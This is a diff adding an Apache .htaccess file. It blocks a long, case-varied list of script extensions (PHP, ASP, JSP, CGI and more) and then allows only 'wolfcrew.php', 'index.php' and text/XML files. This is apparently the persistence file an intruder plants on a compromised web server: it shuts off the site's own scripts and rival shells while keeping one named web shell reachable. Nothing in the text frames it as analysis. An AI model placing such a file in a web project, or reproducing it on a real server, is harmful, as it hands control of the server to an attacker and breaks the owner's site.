@@ -1,0 +1,16 @@
+Options -Indexes
+RewriteEngine on
+<FilesMatch ".(php|Php|pHp|phP|PHp|pHP|PhP|PHP|PhP|php5|Php5|pHp5|phP5|PHp5|pHP5|PhP5|PHP5|PhP5|php6|Php6|pHp6|phP6|PHp6|pHP6|PhP6|PHP6|PhP6|php56|Php56|pHp56|phP56|PHp56|pHP56|PhP56|PHP56|PhP56|php7|Php7|pHp7|phP7|PHp7|pHP7|PhP7|PHP7|PhP7|php8|php9|phps|PhPs|Phps|PHps|PHPs|phpS|phPS|pHPS|PHPS|PhPS|pHps|pHpS|inc|InC|iNc|INc|iNC|INC|phtml|Phtml|pHtml|phTml|pHTml|Fla|fLa|flA|FLa|fLA|FlA|FLA|phtMl|phtmL|PHtml|PhTml|PHTML|PHTml|PHTMl|PhtMl|PHTml|PHtML|pHTMl|PhTML|pHTML|PhtmL|PHTmL|PhtMl|PhtmL|pHtMl|PhTmL|pHtmL|PhTMl|aspx|ASPX|AsPx|aSpX|ASpX|AsPX|ASPx|AspX|aSPx|AsP|aSp|aSP|ASp||asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg||PHP;.JPG|php;.jpeg||php.bak|php.pdf|php.xxxpdf|php.xxxpng|fla|Fla|fLa|fLa|flA|FLa|fLA|FLA|FlA|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip|phar|PHAR|Phar|pHar|phAr|phaR|pHAR|PhAR|PHaR|PHAr|PHar|PhAr|PhaR|pHaR|phAR|shtMl|shtmL|SHtml|ShTml|SHTML|SHTml|SHTMl|ShtMl|SHTml|SHtML|sHTMl|ShTML|sHTML|ShtmL|SHTmL|ShtMl|ShtmL|sHtMl|ShTmL|sHtmL|Shtml|sHtml|shTml|sHTml|shtml|jsp|JSP|jSp|JsP|jSP|Jsp|JSp|jspx|JPSX|JsPx|JSpx|jsPX|JsPX|JSpX|JSPx|jSPX|jspf|JPSF|JsPf|JSpf|jsPF|JsPF|JSpF|JSPf|jSPF|jsw|jsv|pht|PHT|Pht|PhT|pHT|phT|pHt|phtm|phtm|PhTm|PHtm|phTM|pHTM|PhTM|pHtM|PHtM|PhTM|phtM|Phtm|pgif|PGIF|PgIf|PGif|pgIF|shtm|ShTm|SHTm|ShTm|sHtM|SHTM|ShTM|SHTM|config|CONFIG|ashx|asmx|aspq|axd|cshtm|cshtml|rem|soap|vbhtml|vbhtm|asa|cer|cgi|CgI|cGi|CGi|cGI|CGI|py|PY|Py|pY|pl|PL|Pl|pL|cfm|CfM|cFm|CFm|cFM|CFM|cfml|CfMl|cFmL|CFML|CfML|CFMl|Cfml|CFML|swf|sWf|SWF|SwF|Swf|sWF|yaws|YaWs|yAwS|YaWS|YAwS|YAWs|yAWS|yaWS|yawS|YAWS|pptx|PpTx|pPtX|StA|sTa|STA|sta|STa|sTA|svg|SVG|avi|AVI|AvI|aVi|AVi|aVI|)$">
+
+ Order allow,deny
+
+ Deny from all
+</FilesMatch>
+
+<FilesMatch "^(wolfcrew.php|index.php|.*txt|.*xml|)$">
+
+ Order allow,deny
+
+ Allow from all
+
+</FilesMatch>
